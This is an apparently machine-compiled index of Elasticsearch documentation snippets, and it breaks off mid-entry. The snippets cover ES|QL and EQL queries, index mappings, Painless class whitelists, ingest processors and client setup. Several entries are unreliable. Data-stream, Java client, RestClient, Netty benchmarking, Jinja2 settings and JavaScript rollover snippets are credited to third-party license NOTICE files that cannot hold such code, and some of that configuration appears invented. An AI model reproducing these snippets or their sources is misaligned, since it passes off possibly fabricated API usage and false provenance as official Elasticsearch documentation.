https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-readingform.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET kuromoji_sample/_analyze\n{\n  \"analyzer\": \"katakana_analyzer\",\n  \"text\": \"寿司\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Data Stream in Elasticsearch using JSON\nDESCRIPTION: This snippet demonstrates how to create a data stream named 'my-data-stream' using a JSON request to the Elasticsearch API. It specifies the index template and its priority.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/ml/licenses/ojalgo-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT _index_template/my-data-stream-template\n{\n  \"index_patterns\": [\"my-data-stream*\"],\n  \"data_stream\": { },\n  \"priority\": 500\n}\n```\n\n----------------------------------------\n\nTITLE: Foreach Processor Configuration for Object Array\nDESCRIPTION: Configuration of the Foreach processor that removes the id field from each object in an array of person objects.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/foreach-processor.md#2025-04-21_snippet_4\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"foreach\" : {\n    \"field\" : \"persons\",\n    \"processor\" : {\n      \"remove\" : {\n        \"field\" : \"_ingest._value.id\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Settings Configuration with Jinja2 Template\nDESCRIPTION: Example of using Jinja2 templates in Elasticsearch settings configuration. This snippet shows how to include the allocated processors value with a default of 16 if not explicitly set.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/distribution/tools/ansi-console/licenses/jansi-NOTICE.txt#2025-04-21_snippet_3\n\nLANGUAGE: text\nCODE:\n```\nprocessors: {{ processors | default(16) }}\n```\n\n----------------------------------------\n\nTITLE: Defining java.util.regex.Pattern Class Interface for Painless\nDESCRIPTION: Specifies the available Pattern class methods with special annotations for regex limit factors. Notable exclusion of compile() method to prevent dynamic pattern generation for performance reasons.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.regex.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass java.util.regex.Pattern {\n  Predicate asPredicate()\n  int flags()\n  Matcher org.elasticsearch.painless.api.Augmentation matcher(int, CharSequence) @inject_constant[1=\"regex_limit_factor\"]\n  String pattern()\n  String quote(String)\n  String[] org.elasticsearch.painless.api.Augmentation split(int, CharSequence) @inject_constant[1=\"regex_limit_factor\"]\n  String[] org.elasticsearch.painless.api.Augmentation split(int, CharSequence,int) @inject_constant[1=\"regex_limit_factor\"]\n  Stream org.elasticsearch.painless.api.Augmentation splitAsStream(int, CharSequence) @inject_constant[1=\"regex_limit_factor\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Standard Retriever Results for Text Query in Elasticsearch\nDESCRIPTION: The ranked results from the standard retriever using a term query on the text field, showing document IDs and scores before RRF ranking is applied.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion.md#2025-04-21_snippet_6\n\nLANGUAGE: console-result\nCODE:\n```\n\"hits\" : [\n    {\n        \"_index\" : \"example-index\",\n        \"_id\" : \"4\",\n        \"_score\" : 0.16152832,              <1>\n        \"_source\" : {\n            \"integer\" : 2,\n            \"text\" : \"rrf rrf rrf rrf\"\n        }\n    },\n    {\n        \"_index\" : \"example-index\",\n        \"_id\" : \"3\",                        <2>\n        \"_score\" : 0.15876243,\n        \"_source\" : {\n            \"integer\" : 1,\n            \"vector\" : [3],\n            \"text\" : \"rrf rrf rrf\"\n        }\n    },\n    {\n        \"_index\" : \"example-index\",\n        \"_id\" : \"2\",                        <3>\n        \"_score\" : 0.15350538,\n        \"_source\" : {\n            \"integer\" : 2,\n            \"vector\" : [4],\n            \"text\" : \"rrf rrf\"\n        }\n    },\n    {\n        \"_index\" : \"example-index\",\n        \"_id\" : \"1\",                        <4>\n        \"_score\" : 0.13963442,\n        \"_source\" : {\n            \"integer\" : 1,\n            \"vector\" : [5],\n            \"text\" : \"rrf\"\n        }\n    }\n]\n```\n\n----------------------------------------\n\nTITLE: Creating Elasticsearch Java API Client\nDESCRIPTION: This snippet shows how to create an instance of the Elasticsearch Java API Client. It uses a builder pattern to configure the client with server details and other options.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/ent-search/licenses/slf4j-api-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\n// Create the low-level client\nRestClient restClient = RestClient.builder(\n    new HttpHost(\"localhost\", 9200)).build();\n\n// Create the transport with a Jackson mapper\nElasticsearchTransport transport = new RestClientTransport(\n    restClient, new JacksonJsonpMapper());\n\n// And create the API client\nElasticsearchClient client = new ElasticsearchClient(transport);\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Netty Network Options for Benchmarking\nDESCRIPTION: This JSON configuration defines network settings for benchmarking Elasticsearch's Netty implementation. It specifies write buffer thresholds, TCP options, thread allocation, and various client-server connection parameters to optimize performance testing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-api-client-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"cluster\": {\n    \"transport\": {\n      \"write_threshold_high\": \"${transport.write_threshold_high}\",\n      \"write_threshold_low\": \"${transport.write_threshold_low}\",\n      \"tcp_no_delay\": \"${transport.tcp_no_delay}\",\n      \"tcp_keep_alive\": \"${transport.tcp_keep_alive}\",\n      \"tcp_reuse_address\": \"${transport.tcp_reuse_address}\",\n      \"tcp_send_buffer_size\": \"${transport.tcp_send_buffer_size}\",\n      \"tcp_receive_buffer_size\": \"${transport.tcp_receive_buffer_size}\",\n      \"netty\": {\n        \"receive_predictor_size\": \"${transport.receive_predictor_size}\",\n        \"receive_predictor_min\": \"${transport.receive_predictor_min}\",\n        \"receive_predictor_max\": \"${transport.receive_predictor_max}\",\n        \"boss_count\": \"${transport.boss_count}\",\n        \"worker_count\": \"${transport.worker_count}\",\n        \"client_worker_count\": \"${transport.client_worker_count}\"\n      }\n    },\n    \"http\": {\n      \"write_threshold_high\": \"${http.write_threshold_high}\",\n      \"write_threshold_low\": \"${http.write_threshold_low}\",\n      \"tcp_no_delay\": \"${http.tcp_no_delay}\",\n      \"tcp_keep_alive\": \"${http.tcp_keep_alive}\",\n      \"tcp_reuse_address\": \"${http.tcp_reuse_address}\",\n      \"tcp_send_buffer_size\": \"${http.tcp_send_buffer_size}\",\n      \"tcp_receive_buffer_size\": \"${http.tcp_receive_buffer_size}\",\n      \"netty\": {\n        \"receive_predictor_size\": \"${http.receive_predictor_size}\",\n        \"receive_predictor_min\": \"${http.receive_predictor_min}\",\n        \"receive_predictor_max\": \"${http.receive_predictor_max}\",\n        \"boss_count\": \"${http.boss_count}\",\n        \"worker_count\": \"${http.worker_count}\",\n        \"client_worker_count\": \"${http.client_worker_count}\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining DateTimeFormatterBuilder Class in Java\nDESCRIPTION: The DateTimeFormatterBuilder class is used to create custom DateTimeFormatter instances. It provides a variety of methods to append different formatting elements, including patterns, chronology identifiers, and localized formats. This builder pattern allows for flexible composition of formatters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.format.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass java.time.format.DateTimeFormatterBuilder {\n  ()\n  DateTimeFormatterBuilder append(DateTimeFormatter)\n  DateTimeFormatterBuilder appendChronologyId()\n  DateTimeFormatterBuilder appendChronologyText(TextStyle)\n  DateTimeFormatterBuilder appendFraction(TemporalField,int,int,boolean)\n  DateTimeFormatterBuilder appendInstant()\n  DateTimeFormatterBuilder appendInstant(int)\n  DateTimeFormatterBuilder appendLiteral(String)\n  DateTimeFormatterBuilder appendLocalized(FormatStyle,FormatStyle)\n  DateTimeFormatterBuilder appendLocalizedOffset(TextStyle)\n  DateTimeFormatterBuilder appendOffset(String,String)\n  DateTimeFormatterBuilder appendOffsetId()\n  DateTimeFormatterBuilder appendOptional(DateTimeFormatter)\n  DateTimeFormatterBuilder appendPattern(String)\n  DateTimeFormatterBuilder appendText(TemporalField)\n  DateTimeFormatterBuilder appendText(TemporalField,TextStyle)\n  DateTimeFormatterBuilder appendValue(TemporalField)\n  DateTimeFormatterBuilder appendValue(TemporalField,int)\n  DateTimeFormatterBuilder appendValue(TemporalField,int,int,SignStyle)\n  DateTimeFormatterBuilder appendValueReduced(TemporalField,int,int,int)\n  DateTimeFormatterBuilder appendZoneId()\n  DateTimeFormatterBuilder appendZoneOrOffsetId()\n  DateTimeFormatterBuilder appendZoneRegionId()\n  DateTimeFormatterBuilder appendZoneText(TextStyle)\n  DateTimeFormatterBuilder appendZoneText(TextStyle,Set)\n  String getLocalizedDateTimePattern(FormatStyle,FormatStyle,Chronology,Locale)\n  DateTimeFormatterBuilder optionalEnd()\n  DateTimeFormatterBuilder optionalStart()\n  DateTimeFormatterBuilder padNext(int)\n  DateTimeFormatterBuilder padNext(int,char)\n  DateTimeFormatterBuilder parseCaseInsensitive()\n  DateTimeFormatterBuilder parseCaseSensitive()\n  DateTimeFormatterBuilder parseDefaulting(TemporalField,long)\n  DateTimeFormatterBuilder parseLenient()\n  DateTimeFormatterBuilder parseStrict()\n  DateTimeFormatter toFormatter()\n  DateTimeFormatter toFormatter(Locale)\n}\n```\n\n----------------------------------------\n\nTITLE: Generating Conjunction of Multi-Field Functions Query in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create a conjunction query using multiple field functions in Elasticsearch. It combines string concatenation and numeric addition operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_21\n\nLANGUAGE: eql\nCODE:\n```\nprocess where concat(file_name, \".\", process_name) == \"foo\" and add(pid, ppid) > 100\n```\n\nLANGUAGE: json\nCODE:\n```\n{\"bool\":{\"must\":[{\"script\":{\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalEqlScriptUtils.multiValueDocValues(doc,params.v1,X1->InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.eq(InternalEqlScriptUtils.concat([X0,params.v2,X1]),params.v3))))\",\"params\":{\"v0\":\"file_name.keyword\",\"v1\":\"process_name\",\"v2\":\".\",\"v3\":\"foo\"}}}},{\"script\":{\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalEqlScriptUtils.multiValueDocValues(doc,params.v1,X1->InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.gt(InternalQlScriptUtils.add(X0,X1),params.v2))))\",\"params\":{\"v0\":\"pid\",\"v1\":\"ppid\",\"v2\":100}}}}]}\n```\n\n----------------------------------------\n\nTITLE: Function Reference\nDESCRIPTION: Function name and reference link in markdown format\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/date_extract.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n## `DATE_EXTRACT` [esql-date_extract]\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with murmur3 Field Mapping in Elasticsearch\nDESCRIPTION: This snippet shows how to define an index mapping with a keyword field that includes a murmur3 hash sub-field. This allows storing both the original value and its hash for efficient cardinality aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mapper-murmur3-usage.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_field\": {\n        \"type\": \"keyword\",\n        \"fields\": {\n          \"hash\": {\n            \"type\": \"murmur3\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Indonesian Stop Words\nDESCRIPTION: Defines Indonesian stop words used in Elasticsearch analysis and includes a link to the Lucene resource.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_24\n\nLANGUAGE: markdown\nCODE:\n```\n`_indonesian_`\n:   [Indonesian stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/id/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Enabling HTML Sanitization in Elasticsearch YAML\nDESCRIPTION: Controls whether HTML sanitization is enabled for email notifications. Available only on Elastic Cloud Hosted.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_33\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.notification.email.html.sanitization.enabled\n```\n\n----------------------------------------\n\nTITLE: Configure In-Flight Requests Circuit Breaker Settings\nDESCRIPTION: Settings for managing memory usage of active incoming requests. Includes memory limit and overhead multiplier for transport and HTTP level requests.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/circuit-breaker-settings.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nnetwork.breaker.inflight_requests.limit: \"100%\"\nnetwork.breaker.inflight_requests.overhead: 2\n```\n\n----------------------------------------\n\nTITLE: Basic JavaScript Sync Rule for MySQL\nDESCRIPTION: An example of a JavaScript array defining sync rules with tables and query specifications for advanced MySQL operation. This format allows for passing arbitrary SQL statements to MySQL through the connector.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-mysql.md#2025-04-21_snippet_6\n\nLANGUAGE: js\nCODE:\n```\n[\n    {\n        \"tables\": [\"table1\", \"table2\"],\n        \"query\": \"SELECT ... FROM ...\"\n    }\n]\n```\n\n----------------------------------------\n\nTITLE: Change the password of the existing Elasticsearch keystore\nDESCRIPTION: Updates the password of an existing Elasticsearch keystore. Prompts for the current and new passwords if the keystore is protected.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/elasticsearch-keystore.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nbin/elasticsearch-keystore passwd\n```\n\n----------------------------------------\n\nTITLE: Creating RestClient for Elasticsearch in Java\nDESCRIPTION: This snippet demonstrates how to create a RestClient for Elasticsearch using the RestClient.builder() method. It configures the client with multiple hosts and sets various parameters like connection timeout and max retry timeout.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/inference/licenses/reactive-streams-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nRestClient restClient = RestClient.builder(\n    new HttpHost(\"localhost\", 9200, \"http\"),\n    new HttpHost(\"localhost\", 9201, \"http\"))\n    .setHttpClientConfigCallback(new RestClientBuilder.HttpClientConfigCallback() {\n        @Override\n        public HttpAsyncClientBuilder customizeHttpClient(HttpAsyncClientBuilder httpClientBuilder) {\n            return httpClientBuilder.setDefaultIOReactorConfig(\n                IOReactorConfig.custom()\n                    .setIoThreadCount(1)\n                    .build());\n        }\n    })\n    .setRequestConfigCallback(new RestClientBuilder.RequestConfigCallback() {\n        @Override\n        public RequestConfig.Builder customizeRequestConfig(RequestConfig.Builder requestConfigBuilder) {\n            return requestConfigBuilder.setConnectTimeout(5000)\n                .setSocketTimeout(60000);\n        }\n    })\n    .setMaxRetryTimeoutMillis(60000)\n    .build();\n```\n\n----------------------------------------\n\nTITLE: Reading Multivalued Fields in ESQL\nDESCRIPTION: Demonstrates how ESQL reads from multivalued fields, showing that they are returned as JSON arrays. The example includes indexing documents with multivalued fields and querying them.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-multivalued-fields.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /mv/_bulk?refresh\n{ \"index\" : {} }\n{ \"a\": 1, \"b\": [2, 1] }\n{ \"index\" : {} }\n{ \"a\": 2, \"b\": 3 }\n\nPOST /_query\n{\n  \"query\": \"FROM mv | LIMIT 2\"\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 28,\n  \"is_partial\": false,\n  \"columns\": [\n    { \"name\": \"a\", \"type\": \"long\"},\n    { \"name\": \"b\", \"type\": \"long\"}\n  ],\n  \"values\": [\n    [1, [1, 2]],\n    [2,      3]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Default Data Stream Retention Period\nDESCRIPTION: Dynamic setting for the default retention period applied to data streams without explicit retention configuration. Must be greater than 10s and less than or equal to max retention.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/data-stream-lifecycle-settings.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\ndata_streams.lifecycle.retention.default: <time_value>\n```\n\n----------------------------------------\n\nTITLE: Keeping Only Specific Fields with Remove Processor in Elasticsearch\nDESCRIPTION: Configuration example that demonstrates how to use the 'keep' parameter to retain only the 'url' field while removing all other fields from documents during ingest processing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/remove-processor.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"remove\": {\n    \"keep\": [\"url\"]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch Shape with Pre-Indexed Shape\nDESCRIPTION: This snippet shows how to query Elasticsearch for documents whose `geometry` field intersects with a pre-indexed shape. It references the shape by its `index`, `id`, and `path`. This allows reusing pre-defined shapes without specifying their coordinates in each query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-shape-query.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /example/_search\n{\n  \"query\": {\n    \"shape\": {\n      \"geometry\": {\n        \"indexed_shape\": {\n          \"index\": \"shapes\",\n          \"id\": \"footprint\",\n          \"path\": \"geometry\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Checking System Indices in Elasticsearch Cluster\nDESCRIPTION: Command to view system indices within an Elasticsearch cluster. System indices store configuration and state information essential to the operation of the system and should not be directly modified.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/api-conventions.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nGET _cluster/state/metadata?filter_path=metadata.indices.*.system\n```\n\n----------------------------------------\n\nTITLE: CIDR Range Containment Utility\nDESCRIPTION: Provides a utility class for checking if an IP address is contained within a CIDR range using a contains method\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.net.txt#2025-04-21_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\nclass org.elasticsearch.painless.api.CIDR {\n    (String)\n    boolean contains(String)\n}\n```\n\n----------------------------------------\n\nTITLE: Using the 'add' Function in EQL for Elasticsearch\nDESCRIPTION: The 'add' function returns the sum of two provided addends. It supports integers, floats, and null values. If any addend is null, the function returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-function-ref.md#2025-04-21_snippet_0\n\nLANGUAGE: eql\nCODE:\n```\nadd(4, 5)                                           // returns 9\nadd(4, 0.5)                                         // returns 4.5\nadd(0.5, 0.25)                                      // returns 0.75\nadd(4, -2)                                          // returns 2\nadd(-2, -2)                                         // returns -4\n\n// process.args_count = 4\nadd(process.args_count, 5)                          // returns 9\nadd(process.args_count, 0.5)                        // returns 4.5\n\n// process.parent.args_count = 2\nadd(process.args_count, process.parent.args_count)  // returns 6\n\n// null handling\nadd(null, 4)                                        // returns null\nadd(4. null)                                        // returns null\nadd(null, process.args_count)                       // returns null\nadd(process.args_count null)                        // returns null\n```\n\n----------------------------------------\n\nTITLE: Demonstrating COALESCE Function in ESQL\nDESCRIPTION: This snippet shows how to use the COALESCE function in ESQL. It creates a row with two fields, 'a' (null) and 'b' (string), and applies COALESCE to return the first non-null value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/coalesce.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=null, b=\"b\"\n| EVAL COALESCE(a, b)\n```\n\n----------------------------------------\n\nTITLE: Using LENGTH and BIT_LENGTH Functions in ESQL\nDESCRIPTION: This ESQL query filters airports located in India, keeps only the city field, and applies two string functions: LENGTH to count characters and BIT_LENGTH to count bits in the city names.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/bit_length.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airports\n| WHERE country == \"India\"\n| KEEP city\n| EVAL fn_length = LENGTH(city), fn_bit_length = BIT_LENGTH(city)\n```\n\n----------------------------------------\n\nTITLE: Basic SHOW Command Syntax\nDESCRIPTION: Demonstrates the basic syntax structure for the SHOW command in ESQL. The command is used to display system information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/show.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nSHOW item\n```\n\n----------------------------------------\n\nTITLE: Disabling Stored Fields in Elasticsearch Search\nDESCRIPTION: Example of using _none_ to completely disable stored fields (including metadata fields) in the search response, which further reduces response size when only specific data is needed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-selected-fields.md#2025-04-21_snippet_12\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"stored_fields\": \"_none_\",\n  \"query\" : {\n    \"term\" : { \"user\" : \"kimchy\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Augmenting Existing Classes in Painless\nDESCRIPTION: This snippet demonstrates how to augment an existing Java class, such as java.lang.String, by adding a new method that operates on the instance and returns an integer value. This showcases the extensibility of Painless scripting capabilities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/examples/painless-whitelist/src/main/resources/org/elasticsearch/example/painlesswhitelist/example_whitelist.txt#2025-04-21_snippet_1\n\nLANGUAGE: groovy\nCODE:\n```\nclass java.lang.String {\n  # existing classes can be \"augmented\" to have additional methods, which take the object\n  # to operate on as the first argument to a static method\n  int org.elasticsearch.example.painlesswhitelist.ExampleWhitelistedClass toInt()\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring ILM Policy with Dynamic Shard Count Based on Size\nDESCRIPTION: Example of configuring an ILM policy that automatically calculates the optimal number of shards based on a maximum shard size of 50GB. The policy uses max_primary_shard_size to determine the target shard count.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-shrink.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"warm\": {\n        \"actions\": {\n          \"shrink\" : {\n            \"max_primary_shard_size\": \"50gb\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying and Sorting Employee Data with ESQL\nDESCRIPTION: This ESQL query retrieves employee data, selects specific columns, and sorts the results. It keeps only the first_name, last_name, and height fields, then sorts the data in descending order by height and ascending order by first name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/sortTie.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name, height\n| SORT height DESC, first_name ASC\n```\n\n----------------------------------------\n\nTITLE: Creating a custom analyzer with Porter stem filter in Elasticsearch\nDESCRIPTION: This example shows how to use the create index API to configure a new custom analyzer that includes the Porter stem filter. It ensures lowercase tokens by including the lowercase filter before the Porter stem filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-porterstem-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [\n            \"lowercase\",\n            \"porter_stem\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Rolling Over a Data Stream using JavaScript\nDESCRIPTION: This JavaScript snippet shows how to manually roll over a data stream using the Elasticsearch JavaScript client. It sends a POST request to the _rollover endpoint.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/ml/licenses/ojalgo-NOTICE.txt#2025-04-22_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst { Client } = require('@elastic/elasticsearch')\nconst client = new Client({ node: 'http://localhost:9200' })\n\nclient.indices.rollover({\n  alias: 'my-data-stream',\n  body: {\n    \"conditions\": {\n      \"max_age\": \"7d\",\n      \"max_docs\": 1000000\n    }\n  }\n}, (err, result) => {\n  if (err) console.error(err)\n  else console.log(result)\n})\n```\n\n----------------------------------------\n\nTITLE: Optional Type Handling in Java\nDESCRIPTION: Provides a container object which may or may not contain a non-null value, enabling null-safe operations and functional-style value retrieval\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_29\n\nLANGUAGE: java\nCODE:\n```\nclass java.util.Optional {\n  Optional empty()\n  def get()\n  boolean isPresent()\n  def orElse(def)\n}\n```\n\n----------------------------------------\n\nTITLE: Selecting Columns with KEEP Function in ESQL\nDESCRIPTION: This ESQL query selects specific columns (emp_no, first_name, last_name, height) from the 'employees' table using the KEEP function. It demonstrates how to retain only the desired fields in the query result.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/keep.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP emp_no, first_name, last_name, height\n```\n\n----------------------------------------\n\nTITLE: Defining NumberFormatException in Java\nDESCRIPTION: This snippet defines the java.lang.NumberFormatException class, thrown to indicate that the input string is not in a valid format for a number. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_46\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.NumberFormatException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Basic MEDIAN and MEDIAN_ABSOLUTE_DEVIATION Query in ESQL\nDESCRIPTION: Shows how to calculate both median and median absolute deviation of salary data from an employees table.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/median_absolute_deviation.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS MEDIAN(salary), MEDIAN_ABSOLUTE_DEVIATION(salary)\n```\n\n----------------------------------------\n\nTITLE: Customizing position_increment_gap in Elasticsearch Mapping\nDESCRIPTION: This example demonstrates how to set a custom position_increment_gap in the mapping definition. By setting it to 0, phrase queries can match terms across different array elements, which can produce unexpected matching behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/position-increment-gap.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"names\": {\n        \"type\": \"text\",\n        \"position_increment_gap\": 0 <1>\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"names\": [ \"John Abraham\", \"Lincoln Smith\"]\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"match_phrase\": {\n      \"names\": \"Abraham Lincoln\" <2>\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Build Configuration Log Output\nDESCRIPTION: Detailed log of dependency transformations and project configurations occurring during the Elasticsearch build process. Shows various JAR files being processed with different transformation types including InstrumentationAnalysisTransform, MergeInstrumentationAnalysisTransform, and ExternalDependencyInstrumentingArtifactTransform.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nTransforming kotlin-stdlib-1.9.10.jar (org.jetbrains.kotlin:kotlin-stdlib:1.9.10) with InstrumentationAnalysisTransform\nTransforming kotlin-stdlib-1.9.10.jar (org.jetbrains.kotlin:kotlin-stdlib:1.9.10) with MergeInstrumentationAnalysisTransform\nTransforming kotlin-stdlib-common-1.9.10.jar (org.jetbrains.kotlin:kotlin-stdlib-common:1.9.10) with InstrumentationAnalysisTransform\n```\n\n----------------------------------------\n\nTITLE: Categorizing Employee Language Proficiency with CASE in ESQL\nDESCRIPTION: This query uses the CASE function to categorize employees as monolingual, bilingual, or polyglot based on the number of languages they speak. It demonstrates conditional logic in ESQL for data classification.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/case.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| EVAL type = CASE(\n    languages <= 1, \"monolingual\",\n    languages <= 2, \"bilingual\",\n     \"polyglot\")\n| KEEP emp_no, languages, type\n```\n\n----------------------------------------\n\nTITLE: Match Phrase Prefix Query Example\nDESCRIPTION: This example demonstrates how to use the `match_phrase_prefix` query to find documents where the `message` field contains phrases starting with `quick brown f`.  It will match phrases like 